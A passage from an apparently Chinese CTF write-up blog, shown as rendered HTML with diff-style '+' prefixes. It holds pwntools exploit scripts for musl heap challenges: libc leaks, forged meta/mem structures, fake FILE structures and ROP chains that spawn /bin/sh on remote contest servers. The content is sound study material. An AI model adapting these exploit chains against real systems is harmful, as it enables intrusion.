+</span></span><span style=display:flex><span>add(<span style=color:#40a070>9</span>, <span style=color:#40a070>0x2000</span>, payload <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>) <span style=color:#60a0b0;font-style:italic># 9</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>8</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>8</span>, <span style=color:#40a070>0</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0xF</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>show(<span style=color:#40a070>8</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0xF</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>mmaped_addr <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> <span style=color:#40a070>0x30</span> 
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;mmaped: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(mmaped_addr))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>6</span>) 
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>6</span>, <span style=color:#40a070>0</span>, p64(mmaped_addr <span style=color:#666>+</span> <span style=color:#40a070>0x1000</span> <span style=color:#666>+</span> <span style=color:#40a070>0x10</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(heap_addr <span style=color:#666>+</span> <span style=color:#40a070>0x20</span> <span style=color:#666>+</span> <span style=color:#40a070>0xF0</span> <span style=color:#666>-</span> <span style=color:#40a070>0x50</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>7</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>magic_gadget <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x4a5ae</span> 
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x40</span> <span style=color:#60a0b0;font-style:italic># padding</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#60a0b0;font-style:italic># flags</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>*</span> <span style=color:#40a070>2</span> <span style=color:#60a0b0;font-style:italic># rpos, rend</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#60a0b0;font-style:italic># (*close)(FILE *);</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#60a0b0;font-style:italic># wend, wpos</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(mmaped_addr <span style=color:#666>+</span> <span style=color:#40a070>0x30</span> <span style=color:#666>+</span> <span style=color:#40a070>0x300</span>) <span style=color:#60a0b0;font-style:italic># mustbezero_1, [rdi + 0x30]</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(ret) <span style=color:#60a0b0;font-style:italic># wbase, [rdi + 0x38]</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#60a0b0;font-style:italic># (*read)(FILE *, unsigned char *, size_t)</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(magic_gadget) <span style=color:#60a0b0;font-style:italic># (*write)(FILE *, const unsigned char *, size_t)</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>=</span> fake_file<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x8C</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p32(<span style=color:#40a070>0xFFFFFFFF</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> fake_file
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> payload<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x100</span>, <span style=color:#4070a0>&#39;a&#39;</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;/home/ctf/flag/</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>delete(<span style=color:#40a070>4</span>)
+</span></span><span style=display:flex><span>add(<span style=color:#40a070>4</span>, <span style=color:#40a070>0</span>, payload <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt;&#34;</span>, <span style=color:#4070a0>&#39;4&#39;</span>)
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div><p>题目的 flag 名字不叫 flag，所以我先用了一次 getdents64 把文件名读出来，然后再读 flag。这种方法感觉不甚优雅，不知道有没有更好的办法。</p><p><em>注：flag 叫 <code>0_l78zflag</code></em></p><h2 id=reference>reference</h2><blockquote><p><a href=https://www.anquanke.com/post/id/246929>https://www.anquanke.com/post/id/246929</a></p></blockquote><h2 id=又及>又及</h2><p>几天后的第五空间中也出现了一个 musl 的堆题，和这道题也差不多，我感觉这种一直拿着个 musl 出题十分无聊，而且也都是 dequeue 的利用，区别只在 fake_mem 和 fake_meta 的伪造上，这里贴个 exp</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#34;debug&#34;</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>UpdateInfo</span>(size, name, info):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;~$ &#34;</span>, <span style=color:#4070a0>&#39;UpdateInfo&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Length: &#34;</span>, <span style=color:#007020>str</span>(size))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;Name: &#34;</span>, name)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;Info: &#34;</span>, info)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>ViewInfo</span>():
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;~$ &#34;</span>, <span style=color:#4070a0>&#39;ViewInfo&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>AddNote</span>(size, note):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;~$ &#34;</span>, <span style=color:#4070a0>&#39;AddNote&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Size: &#34;</span>, <span style=color:#007020>str</span>(size))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;Note: &#34;</span>, note)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>DelNote</span>(idx):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;~$ &#34;</span>, <span style=color:#4070a0>&#39;DelNote&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Index: &#34;</span>, <span style=color:#007020>str</span>(idx))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>ShowNote</span>(idx):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;~$ &#34;</span>, <span style=color:#4070a0>&#39;ShowNote&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Index: &#34;</span>, <span style=color:#007020>str</span>(idx))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>backdoor</span>(addr):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;~$ &#34;</span>, <span style=color:#4070a0>&#39;B4ckD0or&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Addr: &#34;</span>, <span style=color:#007020>str</span>(addr))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>tempNote</span>(addr, payload):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;~$ &#34;</span>, <span style=color:#4070a0>&#39;TempNote&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;note: &#34;</span>, <span style=color:#007020>str</span>(addr))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;Note: &#34;</span>, payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>EditNote</span>(idx, payload):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;~$ &#34;</span>, <span style=color:#4070a0>&#39;EditNote&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Index: &#34;</span>, <span style=color:#007020>str</span>(idx))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;Note: &#34;</span>, payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process([&#34;./libc.so&#34;, &#34;./notegame&#34;])</span>
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;114.115.152.113&#34;</span>, <span style=color:#40a070>49153</span>)
+</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc.so&#34;</span>)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = remote()</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>AddNote(<span style=color:#40a070>0x20</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x20</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> _ <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>7</span>):
+</span></span><span style=display:flex><span>    AddNote(<span style=color:#40a070>0x3C</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x3C</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>6</span>):
+</span></span><span style=display:flex><span>    DelNote(i <span style=color:#666>+</span> <span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>UpdateInfo(<span style=color:#40a070>0x10</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x10</span>, <span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x10</span>)
+</span></span><span style=display:flex><span>ViewInfo()
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x20</span>)
+</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x8</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> <span style=color:#40a070>0xB7C90</span>
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>__malloc_context <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0xB4AC0</span>
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;__malloc_context: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(__malloc_context))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>backdoor(__malloc_context)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;Mem: &#34;</span>)
+</span></span><span style=display:flex><span>secret <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>8</span>))
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;secret: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(secret))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sc <span style=color:#666>=</span> <span style=color:#40a070>6</span>
+</span></span><span style=display:flex><span>freeable <span style=color:#666>=</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>last_idx <span style=color:#666>=</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>maplen <span style=color:#666>=</span> <span style=color:#40a070>1</span>
+</span></span><span style=display:flex><span>ofl_head_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0xB6E48</span>
+</span></span><span style=display:flex><span>fake_mem_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0xB7940</span>
+</span></span><span style=display:flex><span>mmaped_addr <span style=color:#666>=</span> <span style=color:#40a070>0xDEADBEEF000</span>
+</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x00000000000152a1</span>
+</span></span><span style=display:flex><span>system <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;system&#34;</span>]
+</span></span><span style=display:flex><span>magic_gadget <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x000000000007b1f5</span>
+</span></span><span style=display:flex><span>ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x00000000000152a2</span>
+</span></span><span style=display:flex><span>bin_sh_str <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>search(<span style=color:#4070a0>&#34;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#34;</span>)<span style=color:#666>.</span>next()
+</span></span><span style=display:flex><span>pop_rsp_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x0000000000015e47</span>
+</span></span><span style=display:flex><span>mov_rsp_rdx_jmp_rax <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x0000000000079332</span>
+</span></span><span style=display:flex><span>pop_rdx_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x000000000002cdae</span>
+</span></span><span style=display:flex><span>pop_rax_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x0000000000016a96</span>
+</span></span><span style=display:flex><span>pop_rsi_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x000000000001dad9</span>
+</span></span><span style=display:flex><span>syscall <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x0000000000015a42</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> p64(secret) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(ofl_head_addr <span style=color:#666>-</span> <span style=color:#40a070>0x8</span>) <span style=color:#60a0b0;font-style:italic># prev</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(fake_mem_addr) <span style=color:#60a0b0;font-style:italic># next</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(fake_mem_addr) <span style=color:#60a0b0;font-style:italic># mem</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p32(<span style=color:#40a070>2</span>) <span style=color:#666>+</span> p32(<span style=color:#40a070>0</span>) <span style=color:#60a0b0;font-style:italic># avail_mask, freed_mask</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64((maplen <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>12</span>) <span style=color:#666>|</span> (sc <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>6</span>) <span style=color:#666>|</span> (freeable <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>5</span>) <span style=color:#666>|</span> last_idx)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># 0x40</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(pop_rdi_ret)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(bin_sh_str)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(pop_rsi_ret)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(pop_rdx_ret)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(pop_rax_ret)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>59</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(syscall)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#payload += p64(pop_rdx_ret)</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#payload += p64(fake_mem_addr &amp; 0xFFFFFFFFFFFFF000)</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#payload += p64(pop_rax_ret)</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#payload += p64(system)</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#payload += p64(ret)</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#payload += p64(mov_rsp_rdx_jmp_rax)</span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span> 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>tempNote(mmaped_addr, payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\xFF</span><span style=color:#4070a0>&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x7C</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\xFF</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>AddNote(<span style=color:#40a070>0x6C</span>, payload) <span style=color:#60a0b0;font-style:italic># 1</span>
+</span></span><span style=display:flex><span>AddNote(<span style=color:#40a070>0x6C</span>, payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#60a0b0;font-style:italic># flags</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>*</span> <span style=color:#40a070>2</span> <span style=color:#60a0b0;font-style:italic># rpos, rend</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#60a0b0;font-style:italic># (*close)(FILE *);</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#60a0b0;font-style:italic># wend, wpos</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(mmaped_addr <span style=color:#666>+</span> <span style=color:#40a070>0x40</span>) <span style=color:#60a0b0;font-style:italic># mustbezero_1, [rdi + 0x30]</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(ret) <span style=color:#60a0b0;font-style:italic># wbase, [rdi + 0x38]</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#60a0b0;font-style:italic># (*read)(FILE *, unsigned char *, size_t)</span>
+</span></span><span style=display:flex><span>fake_file <span style=color:#666>+=</span> p64(magic_gadget) <span style=color:#60a0b0;font-style:italic># (*write)(FILE *, const unsigned char *, size_t)</span>
+</span></span><span style=display:flex><span>AddNote(<span style=color:#40a070>0x6C</span>, fake_file[<span style=color:#40a070>0x10</span>:] <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>AddNote(<span style=color:#40a070>0x6C</span>, payload)
+</span></span><span style=display:flex><span>AddNote(<span style=color:#40a070>0x6C</span>, payload)
+</span></span><span style=display:flex><span>AddNote(<span style=color:#40a070>0x6C</span>, payload)
+</span></span><span style=display:flex><span>AddNote(<span style=color:#40a070>0x6C</span>, payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;fake_mem_addr: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(fake_mem_addr))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>EditNote(<span style=color:#40a070>2</span>, <span style=color:#4070a0>&#39;C&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x60</span> <span style=color:#666>+</span> p64(mmaped_addr <span style=color:#666>+</span> <span style=color:#40a070>0x10</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
+</span></span><span style=display:flex><span>DelNote(<span style=color:#40a070>3</span>)
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;~$ &#34;</span>, <span style=color:#4070a0>&#34;Exit&#34;</span>)
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div><p>绕过程中的检查和避免越界只要见招拆招，改相应的参数即可。我在比赛的时候拘泥于 RCTF 这题的伪造方式，一直通不过 free 操作，浪费了大量时间，幸好及时想到改参数，否则应该就做不出来了。</p><h3 id=ctf-2022-babynote>*CTF 2022 babynote</h3><p>2022.4.16 的 StarCTF 中也出现一道 musl，musl 题真的很没意思，我也不新开文章去水了，就写在这里了。利用的仍然是 dequeue 操作</p><p>在 delete 时，没有置空 next 指针，所以存在 UAF。</p><p>考虑先 free 一个 0x28 大小的 group，然后 new note，让 note 结构体占位到这个 group 上，再 UAF show 出来就可以 leak 了。之后也可以通过控制 next 指针实现任意地址 free。伪造 meta 和 group fsop 即可 getshell。</p><p>为了使 note 结构体占位到 content 上，可能需要一点堆风水，这里通过把 note 结构体和 content 分开到两个 groups 中（也就是从属于两个不同的 meta）实现。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-Python data-lang=Python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#34;debug&#34;</span>
+</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process([&#34;./libc.so&#34;, &#34;./babynote&#34;])</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./babynote&#34;)</span>
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;123.60.76.240&#34;</span>, <span style=color:#4070a0>&#34;60001&#34;</span>)
+</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc.so&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>add_note</span>(name_size, name, content_size, content):
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;option:&#34;</span>, <span style=color:#4070a0>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;name size:&#34;</span>, <span style=color:#007020>str</span>(name_size))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;name:&#34;</span>, name)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;note size:&#34;</span>, <span style=color:#007020>str</span>(content_size))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;content:&#34;</span>, content)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>find_note</span>(name_size, name):
